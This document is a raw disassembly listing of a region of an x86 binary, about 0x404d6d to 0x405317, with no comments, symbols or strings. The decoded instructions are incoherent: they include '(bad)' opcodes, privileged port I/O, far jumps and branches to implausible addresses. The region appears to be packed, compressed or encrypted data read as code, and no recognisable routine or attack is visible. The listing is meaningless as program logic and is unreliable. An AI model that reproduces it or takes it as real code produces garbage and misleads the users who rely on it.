  404d6d:	f4                   	hlt
  404d6e:	f9                   	stc
  404d6f:	ea ac c8 4a fc 36 b2 	ljmp   $0xb236,$0xfc4ac8ac
  404d76:	e0 03                	loopne 0x404d7b
  404d78:	1d 5b 49 a7 9b       	sbb    $0x9ba7495b,%eax
  404d7d:	57                   	push   %edi
  404d7e:	da d3                	fcmovbe %st(3),%st
  404d80:	0f 40 b8 30 0c 38 3e 	cmovo  0x3e380c30(%eax),%edi
  404d87:	c0 92 80 f9 1c 27 a8 	rclb   $0xa8,0x271cf980(%edx)
  404d8e:	50                   	push   %eax
  404d8f:	39 5c 12 68          	cmp    %ebx,0x68(%edx,%edx,1)
  404d93:	70 e7                	jo     0x404d7c
  404d95:	28 c7                	sub    %al,%bh
  404d97:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404d98:	69 be f9 bb d2 66 18 	imul   $0x9f1abb18,0x66d2bbf9(%esi),%edi
  404d9f:	bb 1a 9f 
  404da2:	8c e0                	mov    %fs,%eax
  404da4:	e0 36                	loopne 0x404ddc
  404da6:	9a 46 eb e9 31 ae 6d 	lcall  $0x6dae,$0x31e9eb46
  404dad:	60                   	pusha
  404dae:	a8 28                	test   $0x28,%al
  404db0:	c5 f4 2d             	(bad)
  404db3:	31 4f da             	xor    %ecx,-0x26(%edi)
  404db6:	9d                   	popf
  404db7:	57                   	push   %edi
  404db8:	3c a8                	cmp    $0xa8,%al
  404dba:	57                   	push   %edi
  404dbb:	c5 bf 44 b3 17 08    	lds    0x817b344(%edi),%edi
  404dc1:	58                   	pop    %eax
  404dc2:	f3 f9                	repz stc
  404dc4:	77 01                	ja     0x404dc7
  404dc6:	dc f6                	fdiv   %st,%st(6)
  404dc8:	b1 f6                	mov    $0xf6,%cl
  404dca:	f1                   	int1
  404dcb:	5e                   	pop    %esi
  404dcc:	40                   	inc    %eax
  404dcd:	d0 0b                	rorb   $1,(%ebx)
  404dcf:	ab                   	stos   %eax,%es:(%edi)
  404dd0:	8a c5                	mov    %ch,%al
  404dd2:	dc e7                	fsub   %st,%st(7)
  404dd4:	00 51 82             	add    %dl,-0x7e(%ecx)
  404dd7:	cc                   	int3
  404dd8:	82 e6 b4             	and    $0xb4,%dh
  404ddb:	fb                   	sti
  404ddc:	eb 8e                	jmp    0x404d6c
  404dde:	d3 d3                	rcl    %cl,%ebx
  404de0:	74 c5                	je     0x404da7
  404de2:	3c 05                	cmp    $0x5,%al
  404de4:	f9                   	stc
  404de5:	5e                   	pop    %esi
  404de6:	51                   	push   %ecx
  404de7:	82 8b 11 ed eb 84 a0 	orb    $0xa0,-0x7b1412ef(%ebx)
  404dee:	6d                   	insl   (%dx),%es:(%edi)
  404def:	66 de 1a             	data16 ficomps (%edx)
  404df2:	eb 15                	jmp    0x404e09
  404df4:	74 02                	je     0x404df8
  404df6:	59                   	pop    %ecx
  404df7:	91                   	xchg   %eax,%ecx
  404df8:	53                   	push   %ebx
  404df9:	5f                   	pop    %edi
  404dfa:	11 03                	adc    %eax,(%ebx)
  404dfc:	d8 6e 46             	fsubrs 0x46(%esi)
  404dff:	5b                   	pop    %ebx
  404e00:	21 80 a8 31 87 71    	and    %eax,0x718731a8(%eax)
  404e06:	9d                   	popf
  404e07:	14 48                	adc    $0x48,%al
  404e09:	81 f5 ee 72 4a c0    	xor    $0xc04a72ee,%ebp
  404e0f:	ea d8 cd 97 25 1d 4e 	ljmp   $0x4e1d,$0x2597cdd8
  404e16:	35 2a 16 0f ed       	xor    $0xed0f162a,%eax
  404e1b:	7d 21                	jge    0x404e3e
  404e1d:	9c                   	pushf
  404e1e:	88 31                	mov    %dh,(%ecx)
  404e20:	86 d6                	xchg   %dl,%dh
  404e22:	d1 44 37 a1          	roll   $1,-0x5f(%edi,%esi,1)
  404e26:	27                   	daa
  404e27:	58                   	pop    %eax
  404e28:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404e29:	45                   	inc    %ebp
  404e2a:	b6 29                	mov    $0x29,%dh
  404e2c:	9d                   	popf
  404e2d:	cc                   	int3
  404e2e:	00 af f7 42 a0 51    	add    %ch,0x51a042f7(%edi)
  404e34:	f1                   	int1
  404e35:	35 14 cf 68 af       	xor    $0xaf68cf14,%eax
  404e3a:	c2 40 f1             	ret    $0xf140
  404e3d:	90                   	nop
  404e3e:	2b 99 29 98 66 6f    	sub    0x6f669829(%ecx),%ebx
  404e44:	68 99 58 52 67       	push   $0x67525899
  404e49:	a9 b0 3d 89 0e       	test   $0xe893db0,%eax
  404e4e:	66 28 f1             	data16 sub %dh,%cl
  404e51:	f1                   	int1
  404e52:	51                   	push   %ecx
  404e53:	4b                   	dec    %ebx
  404e54:	3a 76 f0             	cmp    -0x10(%esi),%dh
  404e57:	61                   	popa
  404e58:	02 58 88             	add    -0x78(%eax),%bl
  404e5b:	99                   	cltd
  404e5c:	a8 ea                	test   $0xea,%al
  404e5e:	7a 4f                	jp     0x404eaf
  404e60:	52                   	push   %edx
  404e61:	fc                   	cld
  404e62:	fa                   	cli
  404e63:	e3 31                	jecxz  0x404e96
  404e65:	ec                   	in     (%dx),%al
  404e66:	e9 89 e1 28 77       	jmp    0x77692ff4
  404e6b:	67 b6 f4             	addr16 mov $0xf4,%dh
  404e6e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404e6f:	ec                   	in     (%dx),%al
  404e70:	10 6b 3c             	adc    %ch,0x3c(%ebx)
  404e73:	8f 0a 5e 8c          	(bad)
  404e77:	0c 81                	or     $0x81,%al
  404e79:	d7                   	xlat   %ds:(%ebx)
  404e7a:	78 7e                	js     0x404efa
  404e7c:	0a b9 32 29 bd 3f    	or     0x3fbd2932(%ecx),%bh
  404e82:	ad                   	lods   %ds:(%esi),%eax
  404e83:	ad                   	lods   %ds:(%esi),%eax
  404e84:	81 c1 2b 17 80 d1    	add    $0xd180172b,%ecx
  404e8a:	6b 7d bc 6e          	imul   $0x6e,-0x44(%ebp),%edi
  404e8e:	2b 60 08             	sub    0x8(%eax),%esp
  404e91:	66 12 89 53 9a a8 b7 	data16 adc -0x485765ad(%ecx),%cl
  404e98:	14 80                	adc    $0x80,%al
  404e9a:	43                   	inc    %ebx
  404e9b:	d1 99 18 16 75 2e    	rcrl   $1,0x2e751618(%ecx)
  404ea1:	e7 c5                	out    %eax,$0xc5
  404ea3:	0a f0                	or     %al,%dh
  404ea5:	12 a7 bc e6 50 32    	adc    0x3250e6bc(%edi),%ah
  404eab:	a1 cb 93 63 2a       	mov    0x2a6393cb,%eax
  404eb0:	29 91 f4 e4 2c 86    	sub    %edx,-0x79d31b0c(%ecx)
  404eb6:	47                   	inc    %edi
  404eb7:	4c                   	dec    %esp
  404eb8:	c2 f5 34             	ret    $0x34f5
  404ebb:	9c                   	pushf
  404ebc:	13 70 bc             	adc    -0x44(%eax),%esi
  404ebf:	44                   	inc    %esp
  404ec0:	8c 47 30             	mov    %es,0x30(%edi)
  404ec3:	ae                   	scas   %es:(%edi),%al
  404ec4:	42                   	inc    %edx
  404ec5:	8a 87 7f 0f e7 2c    	mov    0x2ce70f7f(%edi),%al
  404ecb:	b9 a9 88 e6 9d       	mov    $0x9de688a9,%ecx
  404ed0:	25 8d e5 ca 6c       	and    $0x6ccae58d,%eax
  404ed5:	c2 65 d9             	ret    $0xd965
  404ed8:	25 88 6e f5 ab       	and    $0xabf56e88,%eax
  404edd:	39 f4                	cmp    %esi,%esp
  404edf:	99                   	cltd
  404ee0:	41                   	inc    %ecx
  404ee1:	2f                   	das
  404ee2:	42                   	inc    %edx
  404ee3:	c1 b0 12 47 dc c7 0a 	shll   $0xa,-0x3823b8ee(%eax)
  404eea:	12 21                	adc    (%ecx),%ah
  404eec:	1b b9 65 73 42 b9    	sbb    -0x46bd8c9b(%ecx),%edi
  404ef2:	ab                   	stos   %eax,%es:(%edi)
  404ef3:	26 ca ad 02          	es lret $0x2ad
  404ef7:	8a d9                	mov    %cl,%bl
  404ef9:	1e                   	push   %ds
  404efa:	d8 d6                	fcom   %st(6)
  404efc:	2c 98                	sub    $0x98,%al
  404efe:	71 a8                	jno    0x404ea8
  404f00:	a2 4f e4 3e 09       	mov    %al,0x93ee44f
  404f05:	8e 18                	mov    (%eax),%ds
  404f07:	9d                   	popf
  404f08:	6a 1d                	push   $0x1d
  404f0a:	1b d7                	sbb    %edi,%edx
  404f0c:	a3 88 ec 24 c1       	mov    %eax,0xc124ec88
  404f11:	4a                   	dec    %edx
  404f12:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404f13:	22 96 da 24 17 13    	and    0x131724da(%esi),%dl
  404f19:	b0 29                	mov    $0x29,%al
  404f1b:	33 c5                	xor    %ebp,%eax
  404f1d:	61                   	popa
  404f1e:	af                   	scas   %es:(%edi),%eax
  404f1f:	c6                   	(bad)
  404f20:	58                   	pop    %eax
  404f21:	48                   	dec    %eax
  404f22:	ed                   	in     (%dx),%eax
  404f23:	73 ca                	jae    0x404eef
  404f25:	3a 02                	cmp    (%edx),%al
  404f27:	18 9d 29 cd 5e 30    	sbb    %bl,0x305ecd29(%ebp)
  404f2d:	e3 3f                	jecxz  0x404f6e
  404f2f:	a1 d6 e2 66 64       	mov    0x6466e2d6,%eax
  404f34:	e1 a8                	loope  0x404ede
  404f36:	a1 c7 f2 42 91       	mov    0x9142f2c7,%eax
  404f3b:	0a 36                	or     (%esi),%dh
  404f3d:	cd 2c                	int    $0x2c
  404f3f:	e6 bd                	out    %al,$0xbd
  404f41:	0a 80 7c 22 b2 d1    	or     -0x2e4ddd84(%eax),%al
  404f47:	f2 a9 45 d6 1e 96    	repnz test $0x961ed645,%eax
  404f4d:	b0 a7                	mov    $0xa7,%al
  404f4f:	62 c9 42             	(bad) {%k7}
  404f52:	67 60                	addr16 pusha
  404f54:	cf                   	iret
  404f55:	03 e0                	add    %eax,%esp
  404f57:	54                   	push   %esp
  404f58:	22 d8                	and    %al,%bl
  404f5a:	e4 61                	in     $0x61,%al
  404f5c:	dc f2                	fdiv   %st,%st(2)
  404f5e:	4b                   	dec    %ebx
  404f5f:	04 71                	add    $0x71,%al
  404f61:	74 91                	je     0x404ef4
  404f63:	2a e3                	sub    %bl,%ah
  404f65:	62 bd 75 c9 22 6d    	bound  %edi,0x6d22c975(%ebp)
  404f6b:	eb 69                	jmp    0x404fd6
  404f6d:	7f 15                	jg     0x404f84
  404f6f:	43                   	inc    %ebx
  404f70:	fa                   	cli
  404f71:	6b 07 ae             	imul   $0xffffffae,(%edi),%eax
  404f74:	e5 db                	in     $0xdb,%eax
  404f76:	02 40 00             	add    0x0(%eax),%al
  404f79:	6b 4c 48 f0 0a       	imul   $0xa,-0x10(%eax,%ecx,2),%ecx
  404f7e:	18 dc                	sbb    %bl,%ah
  404f80:	1f                   	pop    %ds
  404f81:	32 3b                	xor    (%ebx),%bh
  404f83:	ba d9 da 8c 30       	mov    $0x308cdad9,%edx
  404f88:	c3                   	ret
  404f89:	6c                   	insb   (%dx),%es:(%edi)
  404f8a:	91                   	xchg   %eax,%ecx
  404f8b:	5c                   	pop    %esp
  404f8c:	f5                   	cmc
  404f8d:	d8 62 a0             	fsubs  -0x60(%edx)
  404f90:	53                   	push   %ebx
  404f91:	6a 22                	push   $0x22
  404f93:	9e                   	sahf
  404f94:	ed                   	in     (%dx),%eax
  404f95:	2b 9b 92 b7 00 a0    	sub    -0x5fff486e(%ebx),%ebx
  404f9b:	9f                   	lahf
  404f9c:	8c 1a                	mov    %ds,(%edx)
  404f9e:	07                   	pop    %es
  404f9f:	42                   	inc    %edx
  404fa0:	99                   	cltd
  404fa1:	9d                   	popf
  404fa2:	4c                   	dec    %esp
  404fa3:	68 db 8a 78 b3       	push   $0xb3788adb
  404fa8:	da 44 29 29          	fiaddl 0x29(%ecx,%ebp,1)
  404fac:	82 a5 ab a3 13 94 c6 	andb   $0xc6,-0x6bec5c55(%ebp)
  404fb3:	ef                   	out    %eax,(%dx)
  404fb4:	d0 0b                	rorb   $1,(%ebx)
  404fb6:	9e                   	sahf
  404fb7:	66 7b 81             	data16 jnp 0x404f3b
  404fba:	91                   	xchg   %eax,%ecx
  404fbb:	a3 22 35 f3 29       	mov    %eax,0x29f33522
  404fc0:	79 c5                	jns    0x404f87
  404fc2:	18 d2                	sbb    %dl,%dl
  404fc4:	d4 0a                	aam    $0xa
  404fc6:	68 89 6c f2 7f       	push   $0x7ff26c89
  404fcb:	c0 6f 2a 83          	shrb   $0x83,0x2a(%edi)
  404fcf:	c9                   	leave
  404fd0:	6e                   	outsb  %ds:(%esi),(%dx)
  404fd1:	e9 fe db 06 50       	jmp    0x50472bd4
  404fd6:	54                   	push   %esp
  404fd7:	ab                   	stos   %eax,%es:(%edi)
  404fd8:	f2 28 5b d9          	repnz sub %bl,-0x27(%ebx)
  404fdc:	fd                   	std
  404fdd:	5d                   	pop    %ebp
  404fde:	dd 20                	frstor (%eax)
  404fe0:	d0 cf                	ror    $1,%bh
  404fe2:	05 a0 79 ba 33       	add    $0x33ba79a0,%eax
  404fe7:	f1                   	int1
  404fe8:	f1                   	int1
  404fe9:	11 c5                	adc    %eax,%ebp
  404feb:	66 9b                	data16 fwait
  404fed:	c9                   	leave
  404fee:	70 ea                	jo     0x404fda
  404ff0:	24 9c                	and    $0x9c,%al
  404ff2:	1a b2 93 bc 03 84    	sbb    -0x7bfc436d(%edx),%dh
  404ff8:	01 b4 5a dd 5a 65 c4 	add    %esi,-0x3b9aa523(%edx,%ebx,2)
  404fff:	98                   	cwtl
  405000:	6d                   	insl   (%dx),%es:(%edi)
  405001:	12 d1                	adc    %cl,%dl
  405003:	0c 90                	or     $0x90,%al
  405005:	10 23                	adc    %ah,(%ebx)
  405007:	c7 81 18 2c fd 97 4d 	movl   $0x9065614d,-0x6802d3e8(%ecx)
  40500e:	61 65 90 
  405011:	48                   	dec    %eax
  405012:	c7                   	(bad)
  405013:	3d 1f 78 0b c9       	cmp    $0xc90b781f,%eax
  405018:	97                   	xchg   %eax,%edi
  405019:	61                   	popa
  40501a:	62 27                	bound  %esp,(%edi)
  40501c:	2e cd 67             	cs int $0x67
  40501f:	a1 16 dd c8 fd       	mov    0xfdc8dd16,%eax
  405024:	d1 b8 9c 56 50 1a    	sarl   $1,0x1a50569c(%eax)
  40502a:	75 4c                	jne    0x405078
  40502c:	19 97 4a 10 05 3b    	sbb    %edx,0x3b05104a(%edi)
  405032:	2a 10                	sub    (%eax),%dl
  405034:	ae                   	scas   %es:(%edi),%al
  405035:	9f                   	lahf
  405036:	9c                   	pushf
  405037:	c1 1a d8             	rcrl   $0xd8,(%edx)
  40503a:	16                   	push   %ss
  40503b:	35 7b ad 7b 84       	xor    $0x847bad7b,%eax
  405040:	e0 7c                	loopne 0x4050be
  405042:	a9 61 af 18 19       	test   $0x1918af61,%eax
  405047:	7f 0d                	jg     0x405056
  405049:	08 c2                	or     %al,%dl
  40504b:	1c b8                	sbb    $0xb8,%al
  40504d:	55                   	push   %ebp
  40504e:	be 97 17 f0 d8       	mov    $0xd8f01797,%esi
  405053:	1a 00                	sbb    (%eax),%al
  405055:	b3 39                	mov    $0x39,%bl
  405057:	f9                   	stc
  405058:	4f                   	dec    %edi
  405059:	8e 1b                	mov    (%ebx),%ds
  40505b:	51                   	push   %ecx
  40505c:	4f                   	dec    %edi
  40505d:	d5 70                	aad    $0x70
  40505f:	a1 7e 51 a1 10       	mov    0x10a1517e,%eax
  405064:	ec                   	in     (%dx),%al
  405065:	c0 a7 3d b1 57 15 ac 	shlb   $0xac,0x1557b13d(%edi)
  40506c:	0a 44 fb b1          	or     -0x4f(%ebx,%edi,8),%al
  405070:	e1 61                	loope  0x4050d3
  405072:	e1 30                	loope  0x4050a4
  405074:	e4 c7                	in     $0xc7,%al
  405076:	57                   	push   %edi
  405077:	fb                   	sti
  405078:	3b 20                	cmp    (%eax),%esp
  40507a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40507b:	0a 82 c4 6c e2 84    	or     -0x7b1d933c(%edx),%al
  405081:	57                   	push   %edi
  405082:	50                   	push   %eax
  405083:	63 a9 78 36 42 d9    	arpl   %ebp,-0x26bdc988(%ecx)
  405089:	cf                   	iret
  40508a:	7f 21                	jg     0x4050ad
  40508c:	f0 7d 79             	lock jge 0x405108
  40508f:	d1 37                	shll   $1,(%edi)
  405091:	97                   	xchg   %eax,%edi
  405092:	9c                   	pushf
  405093:	58                   	pop    %eax
  405094:	19 d9                	sbb    %ebx,%ecx
  405096:	dc 1f                	fcompl (%edi)
  405098:	68 b6 d0 89 7f       	push   $0x7f89d0b6
  40509d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40509e:	20 ff                	and    %bh,%bh
  4050a0:	af                   	scas   %es:(%edi),%eax
  4050a1:	86 2b                	xchg   %ch,(%ebx)
  4050a3:	18 3d 2a 9c 84 35    	sbb    %bh,0x35849c2a
  4050a9:	77 f0                	ja     0x40509b
  4050ab:	b0 2a                	mov    $0x2a,%al
  4050ad:	7b 54                	jnp    0x405103
  4050af:	b5 da                	mov    $0xda,%ch
  4050b1:	63 71 67             	arpl   %esi,0x67(%ecx)
  4050b4:	18 8e 2a 88 aa b7    	sbb    %cl,-0x485577d6(%esi)
  4050ba:	a0 62 88 dc 22       	mov    0x22dc8862,%al
  4050bf:	20 1d 7f 0b a1 cc    	and    %bl,0xcca10b7f
  4050c5:	a0 f1 6e e5 f5       	mov    0xf5e56ef1,%al
  4050ca:	41                   	inc    %ecx
  4050cb:	7c 09                	jl     0x4050d6
  4050cd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4050ce:	30 0d 2b 9d 57 96    	xor    %cl,0x96579d2b
  4050d4:	36 59                	ss pop %ecx
  4050d6:	87 42 de             	xchg   %eax,-0x22(%edx)
  4050d9:	bc 81 d1 93 ed       	mov    $0xed93d181,%esp
  4050de:	7a cf                	jp     0x4050af
  4050e0:	4c                   	dec    %esp
  4050e1:	0c c6                	or     $0xc6,%al
  4050e3:	3c bc                	cmp    $0xbc,%al
  4050e5:	5d                   	pop    %ebp
  4050e6:	b3 a3                	mov    $0xa3,%bl
  4050e8:	6b 93 b0 b0 06 a6 0f 	imul   $0xf,-0x59f94f50(%ebx),%edx
  4050ef:	f3 f3 53             	repz repz push %ebx
  4050f2:	d3 5a ce             	rcrl   %cl,-0x32(%edx)
  4050f5:	90                   	nop
  4050f6:	e5 c5                	in     $0xc5,%eax
  4050f8:	c3                   	ret
  4050f9:	ce                   	into
  4050fa:	5b                   	pop    %ebx
  4050fb:	a0 a1 46 de 5d       	mov    0x5dde46a1,%al
  405100:	36 a5                	movsl  %ss:(%esi),%es:(%edi)
  405102:	c6                   	(bad)
  405103:	de e5                	fsubp  %st,%st(5)
  405105:	e3 ec                	jecxz  0x4050f3
  405107:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405108:	de 39                	fidivrs (%ecx)
  40510a:	72 e8                	jb     0x4050f4
  40510c:	c2 94 cb             	ret    $0xcb94
  40510f:	f6 c3 43             	test   $0x43,%bl
  405112:	5e                   	pop    %esi
  405113:	b5 64                	mov    $0x64,%ch
  405115:	4d                   	dec    %ebp
  405116:	45                   	inc    %ebp
  405117:	86 c0                	xchg   %al,%al
  405119:	ec                   	in     (%dx),%al
  40511a:	1c 39                	sbb    $0x39,%al
  40511c:	e8 05 f9 28 4e       	call   0x4e694a26
  405121:	32 a1 d3 89 04 a7    	xor    -0x58fb762d(%ecx),%ah
  405127:	c4 a2 90 dc ec 64    	les    0x64ecdc90(%edx),%esp
  40512d:	ef                   	out    %eax,(%dx)
  40512e:	ca 30 08             	lret   $0x830
  405131:	7b 01                	jnp    0x405134
  405133:	90                   	nop
  405134:	e7 b8                	out    %eax,$0xb8
  405136:	a2 2b f6 f6 16       	mov    %al,0x16f6f62b
  40513b:	d8 bd 79 c1 90 6f    	fdivrs 0x6f90c179(%ebp)
  405141:	51                   	push   %ecx
  405142:	5e                   	pop    %esi
  405143:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405144:	75 20                	jne    0x405166
  405146:	33 c8                	xor    %eax,%ecx
  405148:	e4 51                	in     $0x51,%al
  40514a:	2b 26                	sub    (%esi),%esp
  40514c:	fa                   	cli
  40514d:	bc 86 34 dd 6b       	mov    $0x6bdd3486,%esp
  405152:	19 e2                	sbb    %esp,%edx
  405154:	7e 77                	jle    0x4051cd
  405156:	7b e0                	jnp    0x405138
  405158:	d9 14 dc             	fsts   (%esp,%ebx,8)
  40515b:	29 03                	sub    %eax,(%ebx)
  40515d:	55                   	push   %ebp
  40515e:	97                   	xchg   %eax,%edi
  40515f:	66 67 5e             	addr16 pop %si
  405162:	43                   	inc    %ebx
  405163:	0e                   	push   %cs
  405164:	fd                   	std
  405165:	4e                   	dec    %esi
  405166:	66 1c b9             	data16 sbb $0xb9,%al
  405169:	c3                   	ret
  40516a:	b4 2a                	mov    $0x2a,%ah
  40516c:	7d 13                	jge    0x405181
  40516e:	df 71 3e             	fbstp  0x3e(%ecx)
  405171:	fc                   	cld
  405172:	df 95 2a e1 5d 69    	fists  0x695de12a(%ebp)
  405178:	1c 2f                	sbb    $0x2f,%al
  40517a:	d4 15                	aam    $0x15
  40517c:	cc                   	int3
  40517d:	a1 7c ce 89 79       	mov    0x7989ce7c,%eax
  405182:	19 f3                	sbb    %esi,%ebx
  405184:	8c 33                	mov    %?,(%ebx)
  405186:	cf                   	iret
  405187:	05 fd 7d e4 67       	add    $0x67e47dfd,%eax
  40518c:	16                   	push   %ss
  40518d:	cd 64                	int    $0x64
  40518f:	72 f6                	jb     0x405187
  405191:	95                   	xchg   %eax,%ebp
  405192:	5b                   	pop    %ebx
  405193:	17                   	pop    %ss
  405194:	97                   	xchg   %eax,%edi
  405195:	9f                   	lahf
  405196:	34 1d                	xor    $0x1d,%al
  405198:	da 17                	ficoml (%edi)
  40519a:	97                   	xchg   %eax,%edi
  40519b:	67 1a 57 52          	sbb    0x52(%bx),%dl
  40519f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4051a0:	93                   	xchg   %eax,%ebx
  4051a1:	b6 f8                	mov    $0xf8,%dh
  4051a3:	4b                   	dec    %ebx
  4051a4:	0a 77 21             	or     0x21(%edi),%dh
  4051a7:	5a                   	pop    %edx
  4051a8:	d3 eb                	shr    %cl,%ebx
  4051aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4051ab:	79 94                	jns    0x405141
  4051ad:	40                   	inc    %eax
  4051ae:	bb af 57 20 99       	mov    $0x992057af,%ebx
  4051b3:	d7                   	xlat   %ds:(%ebx)
  4051b4:	46                   	inc    %esi
  4051b5:	21 3c a7             	and    %edi,(%edi,%eiz,4)
  4051b8:	35 51 00 5b e5       	xor    $0xe55b0051,%eax
  4051bd:	c9                   	leave
  4051be:	35 0f ac a5 fc       	xor    $0xfca5ac0f,%eax
  4051c3:	1c a5                	sbb    $0xa5,%al
  4051c5:	5b                   	pop    %ebx
  4051c6:	8c 69 05             	mov    %gs,0x5(%ecx)
  4051c9:	96                   	xchg   %eax,%esi
  4051ca:	9b                   	fwait
  4051cb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4051cc:	3e f5                	ds cmc
  4051ce:	1f                   	pop    %ds
  4051cf:	b0 0e                	mov    $0xe,%al
  4051d1:	be 16 44 b2 e7       	mov    $0xe7b24416,%esi
  4051d6:	ef                   	out    %eax,(%dx)
  4051d7:	59                   	pop    %ecx
  4051d8:	f3 3f                	repz aas
  4051da:	df a7 33 7f 0f 9f    	fbld   -0x60f080cd(%edi)
  4051e0:	89 de                	mov    %ebx,%esi
  4051e2:	b3 8d                	mov    $0x8d,%bl
  4051e4:	09 9f dc 97 ff 23    	or     %ebx,0x23ff97dc(%edi)
  4051ea:	2f                   	das
  4051eb:	b7 dc                	mov    $0xdc,%bh
  4051ed:	68 76 ed 79 48       	push   $0x4879ed76
  4051f2:	54                   	push   %esp
  4051f3:	04 49                	add    $0x49,%al
  4051f5:	43                   	inc    %ebx
  4051f6:	d7                   	xlat   %ds:(%ebx)
  4051f7:	db 68 cf             	fldt   -0x31(%eax)
  4051fa:	7e b8                	jle    0x4051b4
  4051fc:	78 b3                	js     0x4051b1
  4051fe:	ce                   	into
  4051ff:	a0 a4 e8 bc 41       	mov    0x41bce8a4,%al
  405204:	e0 c6                	loopne 0x4051cc
  405206:	42                   	inc    %edx
  405207:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405208:	1e                   	push   %ds
  405209:	be 10 e3 57 1d       	mov    $0x1d57e310,%esi
  40520e:	ca ed 27             	lret   $0x27ed
  405211:	e6 d3                	out    %al,$0xd3
  405213:	81 cb 0f 73 68 f3    	or     $0xf368730f,%ebx
  405219:	97                   	xchg   %eax,%edi
  40521a:	b7 e5                	mov    $0xe5,%bh
  40521c:	4c                   	dec    %esp
  40521d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40521e:	e1 98                	loope  0x4051b8
  405220:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405221:	26 1f                	es pop %ds
  405223:	2f                   	das
  405224:	55                   	push   %ebp
  405225:	48                   	dec    %eax
  405226:	cd f5                	int    $0xf5
  405228:	b9 9c 94 fd 94       	mov    $0x94fd949c,%ecx
  40522d:	bb fd 29 e9 55       	mov    $0x55e929fd,%ebx
  405232:	0f 42 66 6d          	cmovb  0x6d(%esi),%esp
  405236:	1d 1b 81 f7 3b       	sbb    $0x3bf7811b,%eax
  40523b:	de 9a db 89 d8 bb    	ficomps -0x44277625(%edx)
  405241:	07                   	pop    %es
  405242:	20 75 d9             	and    %dh,-0x27(%ebp)
  405245:	bf f9 c5 f0 cd       	mov    $0xcdf0c5f9,%edi
  40524a:	7b 26                	jnp    0x405272
  40524c:	50                   	push   %eax
  40524d:	45                   	inc    %ebp
  40524e:	86 2b                	xchg   %ch,(%ebx)
  405250:	40                   	inc    %eax
  405251:	21 87 9f ab d0 00    	and    %eax,0xd0ab9f(%edi)
  405257:	68 29 eb 74 03       	push   $0x374eb29
  40525c:	3b f6                	cmp    %esi,%esi
  40525e:	63 1b                	arpl   %ebx,(%ebx)
  405260:	9b                   	fwait
  405261:	68 f1 fb 44 70       	push   $0x7044fbf1
  405266:	88 33                	mov    %dh,(%ebx)
  405268:	c1 f4 4a             	shl    $0x4a,%esp
  40526b:	3b fa                	cmp    %edx,%edi
  40526d:	e3 b8                	jecxz  0x405227
  40526f:	67 04 7e             	addr16 add $0x7e,%al
  405272:	ca 6e 68             	lret   $0x686e
  405275:	9f                   	lahf
  405276:	f8                   	clc
  405277:	bf 9c 65 cf 3b       	mov    $0x3bcf659c,%edi
  40527c:	ed                   	in     (%dx),%eax
  40527d:	fd                   	std
  40527e:	41                   	inc    %ecx
  40527f:	79 b5                	jns    0x405236
  405281:	0a d0                	or     %al,%dl
  405283:	ab                   	stos   %eax,%es:(%edi)
  405284:	ac                   	lods   %ds:(%esi),%al
  405285:	a2 b7 03 09 f6       	mov    %al,0xf60903b7
  40528a:	04 64                	add    $0x64,%al
  40528c:	69 6d 43 69 59 49 a2 	imul   $0xa2495969,0x43(%ebp),%ebp
  405293:	22 3b                	and    (%ebx),%bh
  405295:	07                   	pop    %es
  405296:	90                   	nop
  405297:	95                   	xchg   %eax,%ebp
  405298:	44                   	inc    %esp
  405299:	04 52                	add    $0x52,%al
  40529b:	43                   	inc    %ebx
  40529c:	2f                   	das
  40529d:	3b 1f                	cmp    (%edi),%ebx
  40529f:	59                   	pop    %ecx
  4052a0:	b0 96                	mov    $0x96,%al
  4052a2:	23 3b                	and    (%ebx),%edi
  4052a4:	5d                   	pop    %ebp
  4052a5:	98                   	cwtl
  4052a6:	41                   	inc    %ecx
  4052a7:	72 f2                	jb     0x40529b
  4052a9:	10 06                	adc    %al,(%esi)
  4052ab:	79 15                	jns    0x4052c2
  4052ad:	6c                   	insb   (%dx),%es:(%edi)
  4052ae:	7e a3                	jle    0x405253
  4052b0:	3d a6 84 ac 81       	cmp    $0x81ac84a6,%eax
  4052b5:	f0 bb dd fb 29 82    	lock mov $0x8229fbdd,%ebx
  4052bb:	07                   	pop    %es
  4052bc:	23 0d fb 96 29 34    	and    0x342996fb,%ecx
  4052c2:	f1                   	int1
  4052c3:	d1 e0                	shl    $1,%eax
  4052c5:	ec                   	in     (%dx),%al
  4052c6:	59                   	pop    %ecx
  4052c7:	f2 24 cc             	repnz and $0xcc,%al
  4052ca:	ea a1 91 a5 fb a6 50 	ljmp   $0x50a6,$0xfba591a1
  4052d1:	70 5d                	jo     0x405330
  4052d3:	60                   	pusha
  4052d4:	5f                   	pop    %edi
  4052d5:	2f                   	das
  4052d6:	4b                   	dec    %ebx
  4052d7:	c2 4a 26             	ret    $0x264a
  4052da:	2d 4a 3e 1f e9       	sub    $0xe91f3e4a,%eax
  4052df:	b6 25                	mov    $0x25,%dh
  4052e1:	0b bd 25 17 e5 f1    	or     -0xe1ae8db(%ebp),%edi
  4052e7:	b0 01                	mov    $0x1,%al
  4052e9:	67 84 bc 2e 94       	test   %bh,-0x6bd2(%si)
  4052ee:	39 87 56 ce 3f fe    	cmp    %eax,-0x1c031aa(%edi)
  4052f4:	9a 18 77 d8 eb ad c2 	lcall  $0xc2ad,$0xebd87718
  4052fb:	05 3c 35 b6 d1       	add    $0xd1b6353c,%eax
  405300:	42                   	inc    %edx
  405301:	5c                   	pop    %esp
  405302:	ac                   	lods   %ds:(%esi),%al
  405303:	22 f9                	and    %cl,%bh
  405305:	14 15                	adc    $0x15,%al
  405307:	d0 3d f4 a5 a7 aa    	sarb   $1,0xaaa7a5f4
  40530d:	cd b6                	int    $0xb6
  40530f:	5b                   	pop    %ebx
  405310:	69 98 18 0a 78 57 06 	imul   $0x4eb83806,0x57780a18(%eax),%ebx
  405317:	38 b8 4e 
